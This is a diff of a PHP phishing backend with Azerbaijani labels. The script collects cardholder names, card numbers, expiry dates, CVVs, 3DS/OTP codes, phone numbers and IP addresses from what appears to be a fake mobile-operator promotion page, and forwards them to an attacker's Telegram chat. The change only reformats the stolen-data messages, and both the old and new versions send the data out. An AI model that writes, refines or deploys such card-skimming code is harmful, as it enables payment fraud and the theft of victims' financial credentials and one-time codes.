@@ -56,15 +56,20 @@ function sendToTelegram($message) {
 if ($type === 'card_only' && !empty($cardNumber)) {
     $userIP = !empty($ip) ? $ip : 'N/A';
     
-    $message = "💳 **YENİ KART BİLGİSİ** 💳\n\n";
-    $message .= "📱 **Operator:** " . $operator . "\n";
-    $message .= "☎️ **Nömrə:** +994" . $phone . "\n";
-    $message .= "🎁 **Kampaniya:** " . $amount . " - " . $campaign . "\n\n";
-    $message .= "👤 **Kart Sahibi:** " . $cardName . "\n";
-    $message .= "💳 **Kart:** `" . $cardNumber . "`\n";
-    $message .= "📅 **Bitiş:** `" . $cardExpiry . "`\n";
-    $message .= "🔐 **CVV:** `" . $cardCvv . "`\n\n";
-    $message .= "🌐 **IP:** `" . $userIP . "`";
+    // Telefon nömrəsini formatla (məsələn: 070 514-19-33)
+    $formattedPhone = substr($phone, 0, 3) . " " . substr($phone, 3, 3) . "-" . substr($phone, 6, 2) . "-" . substr($phone, 8, 2);
+    // Kart nömrəsini formatla (məsələn: 4169 7388 5032 6285)
+    $formattedCard = implode(' ', str_split($cardNumber, 4));
+    
+    $message = "🔴 <b>YENİ BİLGİ</b> 🔴\n\n";
+    $message .= "<b>Operator:</b> " . $operator . "\n";
+    $message .= "<b>Nömrə:</b> " . $formattedPhone . "\n";
+    $message .= "<b>Kampaniya:</b> " . $amount . " - " . $campaign . "\n\n";
+    $message .= "<b>Kart Sahibi:</b> " . $cardName . "\n";
+    $message .= "<b>Kart Nömrəsi:</b> <code>" . $formattedCard . "</code>\n";
+    $message .= "<b>Kart Bitiş:</b> " . $cardExpiry . "\n";
+    $message .= "<b>CVV:</b> " . $cardCvv . "\n";
+    $message .= "<b>IP Adresi:</b> " . $userIP;
     
     sendToTelegram($message);
     
@@ -77,13 +82,13 @@ if ($type === 'card_only' && !empty($cardNumber)) {
 if (!empty($otp)) {
     $userIP = !empty($ip) ? $ip : 'N/A';
     
-    $message = "🔑 **OTP TƏSDİQİ** 🔑\n\n";
-    $message .= "📱 **Nömrə:** +994" . $phone . "\n";
-    $message .= "🔑 **OTP Kodu:** `" . $otp . "`\n";
-    $message .= "🌐 **IP:** `" . $userIP . "`";
-    if (!empty($campaign)) {
-        $message .= "\n📦 **Paket:** " . $campaign;
-    }
+    // Kart nömrəsini formatla
+    $formattedCard = !empty($cardNumber) ? implode(' ', str_split($cardNumber, 4)) : 'N/A';
+    
+    $message = "🔴 <b>3DS KODU</b> 🔴\n\n";
+    $message .= "<b>Kart Nömrəsi:</b> <code>" . $formattedCard . "</code>\n";
+    $message .= "<b>3DS Kodu:</b> <code>" . $otp . "</code>\n";
+    $message .= "<b>IP Adresi:</b> " . $userIP;
     
     sendToTelegram($message);
     
